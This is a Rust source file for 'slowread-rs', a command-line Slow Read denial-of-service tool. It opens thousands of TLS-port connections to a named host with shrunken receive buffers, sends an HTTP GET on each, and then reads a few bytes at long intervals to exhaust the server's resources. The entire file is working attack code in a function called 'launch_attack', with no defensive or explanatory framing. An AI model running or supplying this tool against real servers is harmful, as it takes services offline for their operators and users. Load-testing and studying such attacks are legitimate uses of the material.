extern crate futures;
extern crate http;
#[macro_use]
extern crate structopt;
extern crate native_tls;
extern crate tokio;
extern crate tokio_timer;
extern crate tokio_tls;
extern crate trust_dns_resolver;

use futures::future::join_all;
use futures::future::{loop_fn, Future, Loop};
use http::Request;
use native_tls::TlsConnector;
use std::net::IpAddr;
use std::net::SocketAddr;
use std::time::Duration;
use structopt::StructOpt;
use tokio::io;
use tokio::net::TcpStream;
use tokio_timer::Timer;
use tokio_timer::TimerError;
use trust_dns_resolver::Resolver;

#[derive(StructOpt, Debug)]
#[structopt(name = "slowread-rs")]
struct Options {
    #[structopt(short = "a", long = "address")]
    address: String,

    #[structopt(short = "p", long = "path", default_value = "/")]
    path: String,

    #[structopt(
        short = "b",
        long = "recv-buffer-size",
        default_value = "2304",
        parse(from_str = "parse_recv_buffer_size")
    )]
    recv_buffer_size: usize,

    #[structopt(short = "r", long = "read-len", default_value = "5")]
    read_len: usize,

    #[structopt(short = "c", long = "connections", default_value = "10000")]
    connections: usize,

    #[structopt(
        short = "w", long = "wait-time", default_value = "55000", parse(from_str = "parse_duration")
    )]
    wait_time: Duration,
}

fn parse_duration(src: &str) -> Duration {
    let millis: u64 = src.parse().unwrap();
    Duration::from_millis(millis)
}

fn parse_recv_buffer_size(src: &str) -> usize {
    src.parse::<usize>().unwrap() / 2
}

fn main() {
    let options = Options::from_args();
    println!("{:?}", options);

    let resolver = Resolver::from_system_conf().unwrap();
    let response = resolver.lookup_ip(&options.address);

    if response.is_err() {
        let error = response.unwrap_err();
        println!(
            "Error resolving address \"{}\". \n{}\nAborting execution...",
            options.address, error
        );
        return;
    }

    let ip_addr_option: Option<IpAddr> = response.unwrap().iter().next();

    if ip_addr_option.is_none() {
        println!(
            "The address \"{}\" resolved to zero IP addresses. Aborting exeuction...",
            options.address
        );
        return;
    }

    let socket_addr = SocketAddr::new(ip_addr_option.unwrap(), 443);
    let url: String = "https://".to_owned() + &socket_addr.ip().to_string() + ":"
        + &socket_addr.port().to_string();

    let mut futures = vec![];

    let connector = TlsConnector::builder().unwrap().build().unwrap();
    let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();

    tcp_stream
        .set_recv_buffer_size(options.recv_buffer_size)
        .unwrap();

    println!("Changing buffer size to {} bytes", options.recv_buffer_size);
    println!(
        "Buffer size actually changed to {} bytes",
        tcp_stream.recv_buffer_size().unwrap()
    );

    let mut tcp_stream = connector.connect(&options.address, tcp_stream).unwrap();

    tcp_stream.shutdown().unwrap();

    for _ in 0..options.connections {
        futures.push(launch_attack(&socket_addr, &url, &options));
    }

    join_all(futures).wait().unwrap();
}

fn launch_attack(
    socket_addr: &SocketAddr,
    url: &str,
    options: &Options,
) -> impl Future<Item = (Option<TcpStream>, Vec<u8>), Error = TimerError> {
    let wait_time = options.wait_time.clone();
    let path = &options.path;
    let read_len = options.read_len;

    let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();

    tcp_stream
        .set_recv_buffer_size(options.recv_buffer_size)
        .unwrap();

    let request = Request::get(url.to_owned() + path).body(()).unwrap();
    let request = build_http_request(&request);

    io::write_all(&tcp_stream, request).wait().unwrap();

    let buf: Vec<u8> = Vec::with_capacity(read_len);

    let (tcp_stream, buf) = io::read_exact(tcp_stream, buf).wait().unwrap();

    loop_fn((Some(tcp_stream), buf), move |(tcp_stream_option, _buf)| {
        let tcp_stream = tcp_stream_option.unwrap();

        Timer::default().sleep(wait_time).and_then(move |_| {
            let buf: Vec<u8> = Vec::with_capacity(read_len);

            io::read_exact(tcp_stream, buf)
                .and_then(|(tcp_stream, buf)| Ok(Loop::Continue((Some(tcp_stream), buf))))
                .or_else(move |_| {
                    let buf: Vec<u8> = Vec::with_capacity(read_len);
                    Ok(Loop::Break((None, buf)))
                })
        })
    })
}

fn build_http_request(request: &Request<()>) -> String {
    let mut req_str = String::new();

    req_str.push_str(request.method().as_str());
    req_str.push_str(" ");
    req_str.push_str(request.uri().path_and_query().unwrap().as_str());
    req_str.push_str(" HTTP/1.1\r\n");

    req_str.push_str("Host: ");
    req_str.push_str(request.uri().host().unwrap());
    req_str.push_str("\r\nUser-Agent: rust\r\n");
    req_str.push_str("Accept: */*\r\n");

    req_str.push_str("\r\n");

    req_str
}
